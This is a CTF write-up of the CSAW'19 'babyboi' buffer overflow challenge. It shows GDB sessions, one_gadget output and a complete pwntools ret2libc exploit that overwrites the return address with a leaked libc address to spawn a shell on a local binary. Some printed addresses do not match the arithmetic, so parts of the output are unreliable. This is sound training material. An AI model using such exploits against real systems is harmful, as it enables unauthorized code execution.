### Binary Exploitation

### Source: CSAW_19 

### Basic File Check

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/babyboi]
└─$ file babyboi 
babyboi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1ff55dce2efc89340b86a666bba5e7ff2b37f62, not stripped
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/babyboi]
└─$ checksec babyboi
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Documents/Pentest/BOF/03-begineer_bof/babyboi/babyboi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

We're dealing with a x64 binary whose protection is just `NX (No-Execute)` enabled

The source code is given so no need to decompile using ghidra

Here's the content of the source code

```
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv[]) {
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  char buf[32];
  printf("Hello!\n");
  printf("Here I am: %p\n", printf);
  gets(buf);
}
```

So we see whats basically happening is that

```
1. It prints out hello
2. It then prints the libc printf address
3. Receives our input using get
```

Now we know its vulnerable to buffer overflow cause it uses get function to receive input and gets doesn't check how many bytes is being passed

With that we can overflow the buffer which is initially meant to hold up only 32bytes

Whats also of interest is that it leaks the libc printf address, This is good cause with that we will be able to perform a ret2libc attack

### Exploitation 

So firstly i'll get the offset needed to overwrite rip

Setting a breakpoint after the call to gets 

```
└─$ gdb -q babyboi 
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.11
Reading symbols from babyboi...
(No debugging symbols found in babyboi)
gef➤  disass main
Dump of assembler code for function main:
   0x0000000000400687 <+0>:     push   rbp
   0x0000000000400688 <+1>:     mov    rbp,rsp
   0x000000000040068b <+4>:     sub    rsp,0x30
   0x000000000040068f <+8>:     mov    DWORD PTR [rbp-0x24],edi
   0x0000000000400692 <+11>:    mov    QWORD PTR [rbp-0x30],rsi
   0x0000000000400696 <+15>:    mov    rax,QWORD PTR [rip+0x2009a3]        # 0x601040 <stdout@@GLIBC_2.2.5>
   0x000000000040069d <+22>:    mov    ecx,0x0
   0x00000000004006a2 <+27>:    mov    edx,0x2
   0x00000000004006a7 <+32>:    mov    esi,0x0
   0x00000000004006ac <+37>:    mov    rdi,rax
   0x00000000004006af <+40>:    call   0x400580 <setvbuf@plt>
   0x00000000004006b4 <+45>:    mov    rax,QWORD PTR [rip+0x200995]        # 0x601050 <stdin@@GLIBC_2.2.5>
   0x00000000004006bb <+52>:    mov    ecx,0x0
   0x00000000004006c0 <+57>:    mov    edx,0x2
   0x00000000004006c5 <+62>:    mov    esi,0x0
   0x00000000004006ca <+67>:    mov    rdi,rax
   0x00000000004006cd <+70>:    call   0x400580 <setvbuf@plt>
   0x00000000004006d2 <+75>:    mov    rax,QWORD PTR [rip+0x200987]        # 0x601060 <stderr@@GLIBC_2.2.5>
   0x00000000004006d9 <+82>:    mov    ecx,0x0
   0x00000000004006de <+87>:    mov    edx,0x2
   0x00000000004006e3 <+92>:    mov    esi,0x0
   0x00000000004006e8 <+97>:    mov    rdi,rax
   0x00000000004006eb <+100>:   call   0x400580 <setvbuf@plt>
   0x00000000004006f0 <+105>:   lea    rdi,[rip+0xbd]        # 0x4007b4
   0x00000000004006f7 <+112>:   call   0x400560 <puts@plt>
   0x00000000004006fc <+117>:   mov    rax,QWORD PTR [rip+0x2008e5]        # 0x600fe8
   0x0000000000400703 <+124>:   mov    rsi,rax
   0x0000000000400706 <+127>:   lea    rdi,[rip+0xae]        # 0x4007bb
   0x000000000040070d <+134>:   mov    eax,0x0
   0x0000000000400712 <+139>:   call   0x400590 <printf@plt>
   0x0000000000400717 <+144>:   lea    rax,[rbp-0x20]
   0x000000000040071b <+148>:   mov    rdi,rax
   0x000000000040071e <+151>:   mov    eax,0x0
   0x0000000000400723 <+156>:   call   0x400570 <gets@plt>
   0x0000000000400728 <+161>:   mov    eax,0x0
   0x000000000040072d <+166>:   leave  
   0x000000000040072e <+167>:   ret    
End of assembler dump.
gef➤  b *0x0000000000400728
Breakpoint 1 at 0x400728
gef➤
```

Running it

```
gef➤  r
Starting program: /home/mark/Documents/Pentest/BOF/03-begineer_bof/babyboi/babyboi 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc9000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Hello!
Here I am: 0x7ffff7e1b450
1234567890

Breakpoint 1, 0x0000000000400728 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x007fffffffddd0  →  "1234567890"
$rbx   : 0x007fffffffdf08  →  0x007fffffffe26e  →  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/b[...]"
$rcx   : 0x007ffff7f9ba80  →  0x00000000fbad208b
$rdx   : 0x1               
$rsp   : 0x007fffffffddc0  →  0x007fffffffdf08  →  0x007fffffffe26e  →  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/b[...]"
$rbp   : 0x007fffffffddf0  →  0x0000000000000001
$rsi   : 0x1               
$rdi   : 0x007ffff7f9da20  →  0x0000000000000000
$rip   : 0x00000000400728  →  <main+161> mov eax, 0x0
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x007ffff7dd62a8  →  0x00100022000043f9
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x007fffffffdf18  →  0x007fffffffe2af  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffddc0│+0x0000: 0x007fffffffdf08  →  0x007fffffffe26e  →  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/b[...]"    ← $rsp
0x007fffffffddc8│+0x0008: 0x0000000100000000
0x007fffffffddd0│+0x0010: "1234567890"   ← $rax
0x007fffffffddd8│+0x0018: 0x007ffff7003039 ("90"?)
0x007fffffffdde0│+0x0020: 0x0000000000000000
0x007fffffffdde8│+0x0028: 0x007ffff7ffdad0  →  0x007ffff7fcb000  →  0x03010102464c457f
0x007fffffffddf0│+0x0030: 0x0000000000000001     ← $rbp
0x007fffffffddf8│+0x0038: 0x007ffff7df018a  →  <__libc_start_call_main+122> mov edi, eax
─────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40071b <main+148>       mov    rdi, rax
     0x40071e <main+151>       mov    eax, 0x0
     0x400723 <main+156>       call   0x400570 <gets@plt>
 →   0x400728 <main+161>       mov    eax, 0x0
     0x40072d <main+166>       leave  
     0x40072e <main+167>       ret    
     0x40072f                  nop    
     0x400730 <__libc_csu_init+0> push   r15
     0x400732 <__libc_csu_init+2> push   r14
─────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "babyboi", stopped 0x400728 in main (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400728 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

With this i'll search for the input i gave which is `1234567890`

```
gef➤  search-pattern 1234567890
[+] Searching '1234567890' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffddd0 - 0x7fffffffddda  →   "1234567890" 
gef➤  i f
Stack level 0, frame at 0x7fffffffde00:
 rip = 0x400728 in main; saved rip = 0x7ffff7df018a
 Arglist at 0x7fffffffddf0, args: 
 Locals at 0x7fffffffddf0, Previous frame's sp is 0x7fffffffde00
 Saved registers:
  rbp at 0x7fffffffddf0, rip at 0x7fffffffddf8
gef➤
```

Now we have the address of where our input is stored on the stack and the instruction pointer at that point

Doing the calculation we get the offset `0x7fffffffddf8 - 0x7fffffffddd0 = 0x28`

Now for the exploit creation here's what am going to do 

```
1. Calculate the libc base address
2. Find an address which calls /bin/sh in the libc file using ropgadget 
3. Get where that address is in the libc
4. Overwrite eip to all the /bin/sh
```

So lets get on with calculating the libc base address

First i'll get the libc file

```
└─$ ldd babyboi
        linux-vdso.so.1 (0x00007ffff7fc9000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dc9000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcb000)
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/babyboi]
└─$ cp /lib/x86_64-linux-gnu/libc.so.6 .
```

Now here's the script to calculate the libc address

```
from pwn import *

io = process("./babyboi", env={"LD_PRELOAD":"./libc.so.6"})
libc = ELF('libc.so.6')

print(io.recvuntil("Here I am: "))
leak = io.recvline()
leak = leak.strip("\n")

base = int(leak, 16) - libc.symbols['printf']
print("Calculated libc base address: " + hex(base))
```

On running it

```
└─$ python2 exploit.py
[+] Starting local process './babyboi': pid 49747
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Documents/Pentest/BOF/03-begineer_bof/babyboi/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
Hello!
Here I am: 
Calculated libc base address: 0x7ffff7de2000
[*] Stopped process './babyboi' (pid 49747)
```

Cool so we know that the libc base address is `0x7ffff7de2000`

Now I'll get a shell function in the libc file using one_gadget

```
└─$ one_gadget libc.so.6           
0x4bfe0 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbx == NULL || (u16)[rbx] == NULL

0xf2522 posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x40], 0, rsp+0x70, [rsp+0xf0])
constraints:
  [rsp+0x70] == NULL
  [[rsp+0xf0]] == NULL || [rsp+0xf0] == NULL
  [rsp+0x40] == NULL || (s32)[[rsp+0x40]+0x4] <= 0

0xf252a posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x40], 0, rsp+0x70, r9)
constraints:
  [rsp+0x70] == NULL
  [r9] == NULL || r9 == NULL
  [rsp+0x40] == NULL || (s32)[[rsp+0x40]+0x4] <= 0

0xf252f posix_spawn(rsp+0x64, "/bin/sh", rdx, 0, rsp+0x70, r9)
constraints:
  [rsp+0x70] == NULL
  [r9] == NULL || r9 == NULL
  rdx == NULL || (s32)[rdx+0x4] <= 0
```

Now i'll use the first one which is `0x4bfe0` 

So time to calculate where the address `0x4bfe0` is on the libc library

```
from pwn import *

io = process("./babyboi", env={"LD_PRELOAD":"./libc.so.6"})
libc = ELF('libc.so.6')

print(io.recvuntil("Here I am: "))
leak = io.recvline()
leak = leak.strip("\n")

base = int(leak, 16) - libc.symbols['printf']
print("Calculated libc base address: " + hex(base))

shell = base + 0x4bfe0
print("Shell address is :" + hex(shell))
```

On running it 

```
└─$ python2 exploit.py
[+] Starting local process './babyboi': pid 51441
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Documents/Pentest/BOF/03-begineer_bof/babyboi/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
Hello!
Here I am: 
Calculated libc base address: 0x7ffff7de2000
Shell address is: 0x7ffff7d96020
[*] Stopped process './babyboi' (pid 51441)
```

So lets make the final exploit which will then overwrite the rip to call the shell address

```
from pwn import *
import time

#Starts the target process
io = process("./babyboi", env={"LD_PRELOAD":"./libc.so.6"})
libc = ELF('libc.so.6')

print(io.recvuntil("Here I am: "))
leak = io.recvline()
leak = leak.strip("\n")

#Calculate the libc base address
base = int(leak, 16) - libc.symbols['printf']
print("Calculated libc base address: " + hex(base))

#Calculate the shell address
shell = base + 0x4bfe0
print("Shell address is: " + hex(shell))

#Make the payload
payload = ""
payload += "A"*0x28
payload += p64(shell)

#Send payload
io.sendline(payload)
time.sleep(1)

#Receive shell
print("Pwned Pwned Pwned!!! xD")

#Interactive shell
io.interactive()
```
                                         
Now lets run the exploit

```
└─$ python2 exploit.py 
[+] Starting local process './babyboi': pid 56804
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Documents/Pentest/BOF/03-begineer_bof/babyboi/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
Hello!
Here I am: 
Calculated libc base address: 0x7ffff7de2000
Shell address is: 0x7ffff7e2dfe0
Pwned Pwned Pwned!!! xD
[*] Switching to interactive mode
$ ls 
babyboi  babyboi.c  exploit.py    libc.so.6
$ id
uid=1000(mark) gid=1000(mark) groups=1000(mark),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),121(bluetooth),137(scanner),142(kaboxer)
$ whoami
mark
$ 
```

And we're done

<br> <br>
[Back To Home](../../index.md)



                                 
